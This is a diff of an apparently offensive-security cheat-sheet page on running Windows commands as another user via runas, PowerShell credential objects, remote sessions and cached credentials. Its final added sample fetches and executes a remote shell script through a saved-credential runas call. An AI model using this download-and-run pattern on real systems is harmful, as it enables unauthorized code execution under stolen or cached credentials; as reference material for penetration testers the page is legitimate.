@@ -17,7 +17,9 @@ tags: ["Powershell", "Credential Object", "Windows", "Runas"]
 
 <br>
 
-```console
+```
+LOGON TYPE
+---------------------
 2  Interactive
 3  Network
 4  Batch
@@ -29,10 +31,24 @@ tags: ["Powershell", "Credential Object", "Windows", "Runas"]
 11 CachedInteractive
 ```
 
-### Create credential object
+<small>*Ref: [RunasCS](https://github.com/antonioCoco/RunasCs)*</small>
 
-{{< tab set1 tab1 >}}Method #1{{< /tab >}}
-{{< tab set1 tab2 >}}Method #2{{< /tab >}}
+### Runas (With Password)
+
+```console
+runas /user:'<USER>' "<CMD>"
+```
+
+```console {class="sample-code"}
+runas /user:'admin' "powershell"
+```
+
+### Runas (With Cred Object)
+
+#### 1. Create Credential Object
+
+{{< tab set1 tab1 >}}Method 1{{< /tab >}}
+{{< tab set1 tab2 >}}Method 2{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
 ```console
@@ -72,52 +88,65 @@ $cred = new-object -typename System.Management.Automation.PSCredential -argument
 
 {{< /tabcontent >}}
 
-### Runas (with cred object)
+#### 2. Run Command
 
 {{< tab set2 tab1 >}}Invoke-Command{{< /tab >}}
 {{< tab set2 tab2 >}}PSSession{{< /tab >}}
 {{< tabcontent set2 tab1 >}}
 
 ```console
-# Set computer to localhost if running locally
+# Set Computer to 'localhost' if Running Locally
 Invoke-Command -ScriptBlock { <CMD> } -Credential $cred -Computer <COMPUTER_NAME>
 ```
 
+```console {class="sample-code"}
+Invoke-Command -ScriptBlock { powershell } -Credential $cred -Computer localhost
+```
+
 ```console
-# If error, try
+# If Error, Try
 Invoke-Command -ScriptBlock { <CMD> } -Credential $cred -Computer <COMPUTER_NAME> -auth credssp
 ```
 
 ```console
-# Invoke command with config
-Invoke-Command -ScriptBlock { <CMD> } -Credential $cred -Computer <COMPUTER_NAME> -ConfigurationName config_name
+# Invoke Command with Config
+Invoke-Command -ScriptBlock { <CMD> } -Credential $cred -Computer <COMPUTER_NAME> -ConfigurationName <CONFIG_NAME>
 ```
 
 {{< /tabcontent >}}
 {{< tabcontent set2 tab2 >}}
 
 ```console
+# Set Computer to '.' if Running Locally
+new-pssession -computername <COMPUTER_NAME> -credential $cred
+```
+
+```console {class="sample-code"}
 new-pssession -computername . -credential $cred
 ```
 
 ```console
-# Switch to new session
-enter-pssession 1
+# Switch to New Session
+enter-pssession <SESSION_ID>
 ```
 
 {{< /tabcontent >}}
 
-### Runas (with cache creds)
+### Runas (With Cached Creds)
 
-#### Check cache creds
+#### 1. Check Cached Creds
 
 ```console
 cmdkey /list
 ```
 
-#### Run Command
+#### 2. Run Command
 
 ```console
-# e.g. Upload and run a shell
+runas /user:<DOMAIN>\<USER> /savecred "<CMD>"
+```
+
+```console {class="sample-code"}
+# e.g. Upload and Run a Shell
 runas /user:<DOMAIN>\<USER> /savecred "powershell iex(new-object net.webclient).downloadstring('http://<LOCAL_IP>/shell.ps1')"
 ```
